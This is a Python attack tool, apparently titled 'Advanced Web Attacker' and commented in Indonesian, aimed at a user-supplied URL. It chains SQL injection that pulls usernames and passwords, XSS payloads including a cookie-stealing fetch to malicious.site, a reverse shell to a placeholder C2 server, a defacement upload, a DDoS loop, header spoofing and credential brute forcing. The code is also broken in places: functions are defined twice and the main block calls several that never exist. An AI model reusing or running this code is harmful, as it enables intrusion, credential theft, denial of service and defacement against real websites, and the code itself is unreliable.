import random
import string
import logging
import time
import threading
import requests
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor
import os
import shutil
import datetime
import base64
import urllib.parse
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import json
import hashlib
import re
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
import socket
import subprocess
import pyfiglet
from sklearn.ensemble import RandomForestClassifier
from sklearn.neural_network import MLPClassifier
from sklearn.feature_extraction.text import CountVectorizer
import tensorflow as tf
import numpy as np
from keras.preprocessing.sequence import pad_sequences
from tensorflow.keras.models import load_model

logo = '''
   _____       __    ___ 
  / ___/____ _/ /___/ (_)
  \__ \/ __ `/ / __  / / 
 ___/ / /_/ / / /_/ / /  
/____/\__,_/_/\__,_/_/   
'''

print(logo)

logging.basicConfig(filename='log_serangan.txt', level=logging.INFO, format='%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
M = '\033[95m'
C = '\033[96m'
N = '\033[0m'

def load_file(file_name):
    try:
        with open(file_name, 'r') as file:
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        logging.error(f"File {file_name} tidak ditemukan!")
        return []

USER_AGENTS = load_file('user_agents.txt')
PROXIES = load_file('proxies.txt')

def get_random_proxy():
    return random.choice(PROXIES) if PROXIES else None

def get_random_user_agent():
    ua = UserAgent()
    return ua.random if USER_AGENTS is None else random.choice(USER_AGENTS)

def create_session():
    session = requests.Session()
    session.headers.update({
        'User-Agent': get_random_user_agent(),
        'Referer': ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)),
        'X-Forwarded-For': str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)),
    })
    return session

def encode_payload(payload):
    base64_encoded = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
    hex_encoded = payload.encode('utf-8').hex()
    return base64_encoded, hex_encoded

def url_encode_payload(payload):
    return urllib.parse.quote(payload)

def load_ml_model():
    model = load_model('ml_model.h5')
    return model

def predict_payload(model, payload):
    vectorizer = CountVectorizer()
    payload_vector = vectorizer.transform([payload])
    prediction = model.predict(payload_vector)
    return prediction

def fuzz_target(url):
    fuzz_payloads = [
        "DROP TABLE users;", 
        "' OR 1=1 --", 
        "<script>alert('XSS')</script>", 
        "' OR 1=1 #", 
        "admin' OR '1'='1' --"
    ]
    for payload in fuzz_payloads:
        base64_payload, hex_payload = encode_payload(payload)
        encoded_payload = url_encode_payload(payload)
        fuzzed_url_base64 = f"{url}?input={base64_payload}"
        fuzzed_url_hex = f"{url}?input={hex_payload}"
        fuzzed_url_encoded = f"{url}?input={encoded_payload}"
        
        print(f"Fuzzing URL (Base64): {fuzzed_url_base64}")
        print(f"Fuzzing URL (Hex): {fuzzed_url_hex}")
        print(f"Fuzzing URL (URL Encoded): {fuzzed_url_encoded}")
        
        response_base64 = requests.get(fuzzed_url_base64)
        response_hex = requests.get(fuzzed_url_hex)
        response_encoded = requests.get(fuzzed_url_encoded)
        
        if response_base64.status_code == 200 or response_hex.status_code == 200 or response_encoded.status_code == 200:
            print(f"{G}Fuzzing berhasil pada: {fuzzed_url_base64}, {fuzzed_url_hex}, atau {fuzzed_url_encoded}{N}")
        else:
            print(f"{R}Gagal fuzzing pada: {fuzzed_url_base64}, status code: {response_base64.status_code}{N}")

def advanced_sql_injection(url, session):
    payload = "' UNION SELECT null, username, password FROM users --"
    encoded_payload = url_encode_payload(payload)
    fuzzed_url = f"{url}?id={encoded_payload}"
    response = session.get(fuzzed_url)
    
    if response.status_code == 200:
        print(f"{G}SQL Injection berhasil pada: {url}{N}")
    else:
        print(f"{R}Gagal SQL Injection pada: {url}, status code: {response.status_code}{N}")

def reverse_shell():
    server_ip = 'YOUR_C2_SERVER_IP'
    server_port = 4444
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((server_ip, server_port))
    while True:
        command = sock.recv(1024).decode('utf-8')
        if command == 'exit':
            sock.close()
            break
        output = subprocess.run(command, shell=True, capture_output=True)
        sock.send(output.stdout + output.stderr)

def multi_vector_attack(url, session):
    threading.Thread(target=advanced_sql_injection, args=(url, session)).start()
    threading.Thread(target=fuzz_target, args=(url,)).start()
    threading.Thread(target=reverse_shell).start()

def deface_website(url, session):
    payload = """
    <html>
    <head><title>Hacked</title></head>
    <body><h1>Website Hacked!</h1><p>This website has been compromised.</p></body>
    </html>
    """
    files = {'file': ('deface.html', payload, 'text/html')}
    response = session.post(url, files=files)
    if response.status_code == 200:
        print(f"{G}Website berhasil di-deface pada: {url}{N}")
    else:
        print(f"{R}Gagal deface pada: {url}, status code: {response.status_code}{N}")

def xss_attack(url):
    payload = "<script>alert('XSS Attack!')</script>"
    xss_url = f"{url}?search={payload}"
    response = requests.get(xss_url)
    if payload in response.text:
        print(f"{G}XSS berhasil pada: {xss_url}{N}")
    else:
        print(f"{R}Gagal XSS pada: {xss_url}{N}")

def ddos_attack(url):
    while True:
        try:
            response = requests.get(url, headers={'User-Agent': get_random_user_agent()})
            delay = max(0.1, response.elapsed.total_seconds())  
            print(f"{M}DDoS Attack on: {url}, Status Code: {response.status_code}, Delay: {delay}s{N}")
            time.sleep(delay)  
        except requests.exceptions.RequestException as e:
            print(f"{R}Error during DDoS attack: {e}{N}")
            break

def exfiltrate_data(url, session):
    payload = "' OR 1=1 --"
    encoded_payload = url_encode_payload(payload)
    exfiltrate_url = f"{url}?input={encoded_payload}"
    try:
        response = session.get(exfiltrate_url)
        if response.status_code == 200:
            print(f"{G}Exfiltrasi data berhasil pada: {exfiltrate_url}{N}")
        else:
            print(f"{R}Gagal exfiltrasi data pada: {exfiltrate_url}, status code: {response.status_code}{N}")
    except requests.exceptions.RequestException as e:
        print(f"{R}Error during exfiltration: {e}{N}")

def adaptive_payload(url, model):
    payloads = [
        "' OR '1'='1';", 
        "<img src='x' onerror='alert(1)' />", 
        "<script>fetch('https://malicious.site/?cookie=' + document.cookie)</script>"
    ]
    for payload in payloads:
        prediction = predict_payload(model, payload)
        if prediction == 1:
            print(f"{Y}ML Model detects malicious payload: {payload}{N}")
            encoded_payload = url_encode_payload(payload)
            response = requests.get(f"{url}?input={encoded_payload}")
            if response.status_code == 200:
                print(f"{G}Payload berhasil pada: {url} dengan payload {payload}{N}")
            else:
                print(f"{R}Gagal dengan payload {payload}, status code: {response.status_code}{N}")

def reconnaissance(target_url):
    session = create_session()
    try:
        response = session.get(target_url)
        if response.status_code == 200:
            print(f"{G}Berhasil melakukan reconnaissance pada: {target_url}{N}")
            print(f"{C}Response Headers: {response.headers}{N}")
            print(f"{C}Cookies: {response.cookies}{N}")
            
            detect_database(target_url, session)
            
            extract_database_structure(target_url, session)
            
            if 'X-Powered-By' in response.headers:
                print(f"{Y}X-Powered-By: {response.headers['X-Powered-By']}{N}")
            if 'Server' in response.headers:
                print(f"{Y}Server: {response.headers['Server']}{N}")
            
            # Check for possible SQL injection points
            check_sql_injection(target_url, session)
        else:
            print(f"{R}Reconnaissance gagal pada: {target_url}, status code: {response.status_code}{N}")
    except requests.exceptions.RequestException as e:
        print(f"{R}Error during reconnaissance: {e}{N}")

def detect_database(target_url, session):
    payloads = [
        "' OR 1=1 --",  
        "' AND 1=1 --",
        "' UNION SELECT null, version() --",  
        "' UNION SELECT null, database() --"  
    ]
    for payload in payloads:
        encoded_payload = url_encode_payload(payload)
        fuzzed_url = f"{target_url}?input={encoded_payload}"
        response = session.get(fuzzed_url)
        
        if 'mysql' in response.text.lower():
            print(f"{Y}Target appears to be running MySQL database.{N}")
            break
        elif 'PostgreSQL' in response.text:
            print(f"{Y}Target appears to be running PostgreSQL database.{N}")
            break
        elif 'SQLite' in response.text:
            print(f"{Y}Target appears to be running SQLite database.{N}")
            break

def extract_database_structure(target_url, session):
    """
    Try to extract the database structure such as tables and columns.
    """
    tables_payload = "' UNION SELECT null, table_name FROM information_schema.tables --"
    columns_payload = "' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name = 'users' --"
    
    print(f"{B}Extracting tables...{N}")
    encoded_tables_payload = url_encode_payload(tables_payload)
    fuzzed_url = f"{target_url}?input={encoded_tables_payload}"
    response = session.get(fuzzed_url)
    
    if response.status_code == 200 and "table_name" in response.text:
        print(f"{G}Tables found: {response.text}{N}")
        
        print(f"{B}Extracting columns from 'users' table...{N}")
        encoded_columns_payload = url_encode_payload(columns_payload)
        fuzzed_url = f"{target_url}?input={encoded_columns_payload}"
        response = session.get(fuzzed_url)
        
        if response.status_code == 200 and "column_name" in response.text:
            print(f"{G}Columns found in 'users' table: {response.text}{N}")
        else:
            print(f"{R}Failed to extract columns or no 'users' table found.{N}")
    else:
        print(f"{R}Failed to extract tables from the database.{N}")

def check_sql_injection(target_url, session):
    payloads = [
        "' OR 1=1 --", 
        "' AND 1=1 --", 
        "' UNION SELECT null, username, password FROM users --"
    ]
    for payload in payloads:
        encoded_payload = url_encode_payload(payload)
        fuzzed_url = f"{target_url}?input={encoded_payload}"
        response = session.get(fuzzed_url)
        
        if response.status_code == 200:
            print(f"{G}Possible SQL Injection detected at: {fuzzed_url}{N}")
        else:
            print(f"{R}No SQL Injection detected at: {fuzzed_url}{N}")

def banner_grabbing(target_ip):
    banner = ''
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target_ip, 80))
        banner = sock.recv(1024).decode('utf-8')
        sock.close()
        if banner:
            print(f"{C}Banner from {target_ip}: {banner}{N}")
        else:
            print(f"{R}No banner received from {target_ip}{N}")
    except socket.error as e:
        print(f"{R}Error connecting to {target_ip}: {e}{N}")

def deface_target(url, session):
    payload = """
    <html>
    <head><title>Hacked</title></head>
    <body><h1>Website Hacked!</h1><p>This website has been compromised.</p></body>
    </html>
    """
    files = {'file': ('deface.html', payload, 'text/html')}
    response = session.post(url, files=files)
    if response.status_code == 200:
        print(f"{G}Website berhasil di-deface pada: {url}{N}")
    else:
        print(f"{R}Gagal deface pada: {url}, status code: {response.status_code}{N}")

def reverse_shell():
    server_ip = 'YOUR_C2_SERVER_IP'
    server_port = 4444
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((server_ip, server_port))
    while True:
        command = sock.recv(1024).decode('utf-8')
        if command == 'exit':
            sock.close()
            break
        output = subprocess.run(command, shell=True, capture_output=True)
        sock.send(output.stdout + output.stderr)

if __name__ == "__main__":
    print(pyfiglet.figlet_format("Advanced Web Attacker"))
    print(f"{M}Welcome to the Advanced Web Application Security Testing Tool!{N}")
    
    ml_model = load_ml_model()

    target_url = input(f"{Y}Masukkan URL target yang ingin diuji: {N}")
    
    deep_scan(target_url)
    
    username_list = ['admin', 'user1', 'guest']
    password_list = ['password123', 'admin123', 'qwerty']
    brute_force_login(target_url, username_list, password_list)
    ddos_attack(target_url)
    dynamic_payload_generator(target_url, create_session())

    print(f"{M}All attacks completed on: {target_url}{N}")
